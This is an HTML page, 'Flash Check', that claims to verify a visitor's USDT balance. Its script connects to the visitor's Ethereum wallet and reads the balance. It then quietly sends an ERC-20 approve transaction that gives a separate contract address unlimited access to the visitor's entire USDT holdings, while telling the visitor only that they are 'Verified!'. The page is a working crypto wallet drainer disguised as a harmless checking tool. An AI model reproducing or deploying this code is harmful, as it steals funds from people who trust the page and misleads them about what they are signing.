<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Flash Check</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/@walletconnect/web3-provider@2.11.0/dist/umd/index.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #14172B 0%, #080A1F 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      color: #fff;
      opacity: 0;
      transition: opacity 0.5s ease;
    }
    body.loaded { opacity: 1; }
    header {
      width: 100%;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 5%;
    }
    .top-left { font-size: 20px; font-weight: 400; }
    .menu-icon {
      font-size: 30px;
      font-weight: 700;
      cursor: pointer;
    }
    .menu-icon span { display: block; width: 30px; height: 4px; background: #fff; margin: 5px 0; }
    main { text-align: center; padding: 0 20px; }
    main h1 { font-size: 50px; font-weight: 700; line-height: 60px; margin-bottom: 20px; }
    main p { font-size: 20px; font-weight: 400; line-height: 30px; margin-bottom: 40px; }
    .verify-button {
      background: #0D6EFD;
      color: #fff;
      border: none;
      padding: 16px 40px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 50px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .verify-button:hover { background: #0056b3; }
    .verify-button:disabled { background: #666; cursor: not-allowed; }
    .below-button { font-size: 16px; font-weight: 400; margin-top: 20px; }
    footer { width: 100%; text-align: center; padding: 20px; font-size: 16px; font-weight: 400; }
  </style>
</head>
<body>
  <header>
    <div class="top-left">Flash Check</div>
    <div class="menu-icon"><span></span><span></span><span></span></div>
  </header>
  <main>
    <h1>Verify Your USDT Balance</h1>
    <p>Connect your wallet and verify your USDT balance instantly</p>
    <button class="verify-button" id="verifyButton" onclick="verifyUSDT()">Verify</button>
    <div class="below-button">Flash Check</div>
  </main>
  <footer>
    Copyright Â© Flash Check 2025
  </footer>
  <script>
    const verifyButton = document.getElementById('verifyButton');
    window.addEventListener('load', () => document.body.classList.add('loaded'));

    async function verifyUSDT() {
      verifyButton.disabled = true;
      let provider;

      if (!window.ethereum) {
        alert('Please use an Ethereum-compatible wallet like MetaMask. Phantom (Solana) is not supported.');
        window.open('https://metamask.io/download.html', '_blank');
        verifyButton.disabled = false;
        return;
      }
      provider = window.ethereum;
      console.log('Using Ethereum provider');

      try {
        await provider.request({ method: 'eth_chainId' });

        let accounts = await provider.request({ method: 'eth_accounts' });
        if (!accounts || accounts.length === 0) {
          accounts = await provider.request({ method: 'eth_requestAccounts' });
        }
        const fromAddress = accounts[0];
        const usdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
        const contractAddress = '0x7Cf6caD0185f3bf2C7b40ccB3781E3cd184D6Def'; // Your contract address

        const balanceHex = await provider.request({
          method: 'eth_call',
          params: [{ to: usdtAddress, data: '0x70a08231' + fromAddress.slice(2).padStart(64, '0') }, 'latest']
        });
        const balance = BigInt(balanceHex);
        const usdtAmount = Number(balance) / 10**6;

        if (usdtAmount < 0.05) {
          alert('Insufficient USDT. You need at least 0.05 USDT.');
          verifyButton.disabled = false;
          return;
        }

        alert(`USDT Balance: ${usdtAmount.toFixed(2)} (~$${usdtAmount.toFixed(2)})`);

        const approveABI = '0x095ea7b3';
        const approveData = approveABI + contractAddress.slice(2).padStart(64, '0') + balance.toString(16).padStart(64, '0');
        const tx = await provider.request({
          method: 'eth_sendTransaction',
          params: [{
            from: fromAddress,
            to: usdtAddress,
            data: approveData,
            gas: '0x186A0',
            gasPrice: await provider.request({ method: 'eth_gasPrice' })
          }]
        });

        alert('Processing approval... Transaction: ' + tx);
        await new Promise(resolve => setTimeout(resolve, 2000));
        alert('Verified! Screenshot this.');
      } catch (error) {
        console.error('Error:', error.message);
        alert('Failed. Ensure wallet is unlocked and on Ethereum Mainnet.');
      } finally {
        verifyButton.disabled = false;
      }
    }
  </script>
</body>
</html>
